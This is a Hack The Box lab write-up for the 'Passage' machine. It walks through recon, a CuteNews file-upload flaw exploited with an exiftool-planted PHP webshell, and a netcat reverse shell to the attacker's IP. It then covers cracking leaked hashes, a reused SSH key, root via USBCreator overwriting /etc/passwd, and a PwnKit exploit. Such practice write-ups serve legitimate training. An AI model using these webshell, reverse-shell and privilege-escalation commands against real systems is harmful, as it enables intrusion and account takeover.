## Default Information
IP Address: 10.10.10.206\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.206    passage.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.206 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-20 05:08:38 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.206                                    
Discovered open port 80/tcp on 10.10.10.206  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22 | ssh | OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | Open |
| 80 | http | Apache httpd 2.4.18 ((Ubuntu)) | Open |

### Web Enumeration of port 80
Using Gobuster, we were unable to find any meaningful endpoints, and what is interesting is that there were not much endpoints that could be discovered using Gobuster.

Visiting http://passage.htb, we notice a comment *Implemented Fail2Ban* as the first post on the page that caught my attention. Readin the post, I realized that this site implements Fail2Ban which means that any bruteforce on the page will be banned for 2 minutes. This explains why we are unable to find any endpoints from our Gobuster enumeration.
![fail2ban](https://github.com/joelczk/writeups/blob/main/HTB/Images/Passage/fail2ban.png)

Looking at the source code, we were able to find 2 users, paul@passage.htb and nadav@passage.htb

```
<span><i class="icon-user icon-blog-mini"></i> By <a href="mailto:paul@passage.htb">Paul Coles</a></span>
<span><i class="icon-user icon-blog-mini"></i> By <a href="mailto:nadav@passage.htb">admin</a></span>
```

Next, we are also able to know that this site is powered by CuteNews

```
<!-- **CSS - stylesheets** -->
<link href="CuteNews/libs/css/cosmo.min.css" rel="stylesheet">
<link href="CuteNews/libs/css/font-awesome.min.css" rel="stylesheet">
<!-- **JS Javascripts** -->
<script src="CuteNews/libs/js/jquery.js"></script>
<script src="CuteNews/libs/js/bootstrap.min.js"></script>
```

With some research on CuteNews, we are able to find an endpoint (http://passage.htb/CuteNews/index.php?register) that allows us to register a user.
![Register Account on CuteNews](https://github.com/joelczk/writeups/blob/main/HTB/Images/Passage/registeraccount.png)

## Exploit
### File upload vulnerability
Browsing to http://passage.htb/CuteNews/index.php?mod=main&opt=personal after authenticating as the new user, we are able to find an option to upload images. We also realize that the image will be saved at http://passage.htb/CuteNews/uploads/avatar_{username}_{filename}

We also realize that the image upload does not do file extensions verification. As such, we are able to upload an image file with the file extension of php, and access the file at the image location url.

![File extension vulnerability](https://github.com/joelczk/writeups/blob/main/HTB/Images/Passage/file_extension_vulnerability.png)

We also realize that we are unable to upload a php file onto the website. Probably, the backend does some magic number verification. 

Let us attempt to bypass magic number check by introducing a shell inside the metadata using exiftool. Afterwards, we will rename the image file to become index.php

```
┌──(kali㉿kali)-[~/Desktop]
└─$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' index.jpeg                                  1 ⨯
    1 image files updated
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ mv index.jpeg index.php  
```

Lastly we will upload the php file onto the site and visit http://passage.htb/CuteNews/uploads/avatar_testaccount_index.php?cmd=id to exploit the webshell.
![webshell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Passage/webshell.png)

We can then use the webshell to obtain a reverse shell by browsing to http://passage.htb/CuteNews/uploads/avatar_testaccount_index.php?cmd=nc%2010.10.16.3%204000%20-e%20/bin/bash
![Reverse Shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Passage/reverse_shell.png)

### Privilege Escalation to Paul
However, we realize that we are currently the www-data user, and we do not have the privilege to access the paul or nadav user which is where the user flag is most probably stored in. Hence, we would need some privilege escalation vector to escalate our privileges to either one of the user.

From linpeas script, we are able to find an interesting directory (/var/www/html/CuteNews/cdata/users). We will then navigate to the directory to check for any interesting information. In the directory, we are able to find a ```lines``` file.

Checking out the contents of ```lines``` file, we are able to find a few base64 encoded string. Decoding the base64 encoded string, we realize that this is actually a serialized PHP data that contains a hashed password and the email address of the user

We will first save the ```lines``` file to our local machine and write a script to decode the base64 encoded string, and filter out all the passage.htb users
```
┌──(HTB)─(kali㉿kali)-[~/Desktop/passage]
└─$ python3 decode.py
a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}
a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
```

From here, we can obtain 2 password hashes for nadav@passage.htb and paul@passage.htb.

```
nadav@passage.htb: 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
paul@passage.htb: e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
```

Using crackstation, we are able to crack the password hash of paul@passage.htb.

![Cracking hashes using crackstation](https://github.com/joelczk/writeups/blob/main/HTB/Images/Passage/crackstation.png)

We can then escalate our privileges to become paul using the ```su``` command.

```
www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
su paul
Password: atlanta1

paul@passage:/var/www/html/CuteNews/cdata/users$
```

### Privilege Escalation to nadav

Using Linpeas Privilege Escalation script, we were able to find a id_rsa file in /home/paul/.ssh/id_rsa. However, in the id_rsa.pub file, we realize that this id_rsa actually belongs to nadav@passage.

```
-rw-r--r-- 1 paul paul 395 Jul 21  2020 /home/paul/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```

Next, we will transfer the id_rsa file from the server ot our local machine. Finally, we will then use the id_rsa file to login to the nadav user via ssh.

```
┌──(kali㉿kali)-[~/Desktop/passage]
└─$ sudo chmod 600 id_rsa
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/passage]
└─$ ssh -i id_rsa nadav@10.10.10.206
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ 
```

### Obtaining user flag
```
paul@passage:~$ cat /home/paul/user.txt
cat /home/paul/user.txt
<Redacted user flag>
```

### Privilege Escalation to root
Using linpeas script, we are able to find out that the machine is vulnerable to privilege escalation via USBCreator.

```
╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                                                                
Vulnerable!! 
```

Using the vulnerability writeup from [here](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/), we realized that we are able to overwrite arbitary files with arbitary content as a root user.

However, this does not automatically escalate our privileges to a root user. Since we are able to overwrite arbitary files, we will then proceed to modify the /etc/passwd file and create a new root user.

To start with, let us first copy the /etc/passwd file to a ```passwd``` file in the /tmp directory.

```
cp /etc/passwd passwd
```

Afterwards, we will use openssl to generate an encrypted password that we will add the new user to the /tmp/passwd file. 

```
nadav@passage:/tmp$ openssl passwd -1 -salt user3 pass123
$1$user3$rAGRVf5p2jYTqtqOW5cPu/
nadav@passage:/tmp$ echo 'user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash' >> passwd
```

Lastly, we will use the USBCreator vulnerability to replace the /etc/passwd file with our own /tmp/passwd file. This will add a new user called ```user3``` with root privileges.

```
nadav@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/passwd /etc/passwd true 
()
```

We can now easily escalate the privileges to root using the new user, user3 and the password as pass123

```
nadav@passage:/tmp$ su user3
Password: 
bash: /bin/bash/.bashrc: Not a directory
root@passage:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:/tmp# 
```

### Obtaining root flag
```
root@passage:/tmp# cat /root/root.txt
<Redacted root flag>
```

## Post-Exploitation
### CVE-2021-4034
Using linpeas script, we realize that this server is actually vulnerable to CVE-2021-4034. This CVE will immediately give us root privileges. Apart from that, we also realize that ```gdb``` is present on the server. This means that we can compile the code on the server and execute the exploit code.

To exploit this, we can first clone the exploit code from [here](https://github.com/berdav/CVE-2021-4034) onto our local machine. Afterwards, we can then transfer the directory to our machine. 

Next, we will compile the exploit code on the machine and execute the exploit code.

```
www-data@passage:/tmp/CVE-2021-4034/exploit$ make
make
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
www-data@passage:/tmp/CVE-2021-4034/exploit$ chmod +x cve-2021-4034
chmod +x cve-2021-4034
www-data@passage:/tmp/CVE-2021-4034/exploit$ ./cve-2021-4034
./cve-2021-4034
# whoami
whoami
root
# 
```

### Obtaining user and root flag using USBCreator

Looking at our linpeas script as a www-data/paul user, the machine is already vulnerable to USBCreator. However, we are unable to exploit it in this case due to a lack of permissions.

```
www-data@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/paul/user.txt /tmp/user.txt true
Creator.Image /home/paul/user.txt /tmp/user.txt truebject-path /com/ubuntu/USBCreator --method com.ubuntu.USB 
Error: GDBus.Error:org.freedesktop.DBus.Python.dbus.exceptions.DBusException: com.ubuntu.USBCreator.Error.NotAuthorized
(According to introspection data, you need to pass 'ssb')
```

With some research, we realize that for this exploit to work the user has to be in the sudoer group. However, the user paul and www-data is not in the sudoer group. On the other hand, navdav is in the suoder group and so the exploit can work. 

```
www-data@passage:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
paul@passage:/tmp$ id
id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
### Obtaining hashes
Dangerously, the hashes can also be publicly accessible from the website itself without authentication. All the hashes can also be obtained by navigating to http://passage.htb/CuteNews/cdata/users/lines

![Obtaining hashes](https://github.com/joelczk/writeups/blob/main/HTB/Images/Passage/hash.png)
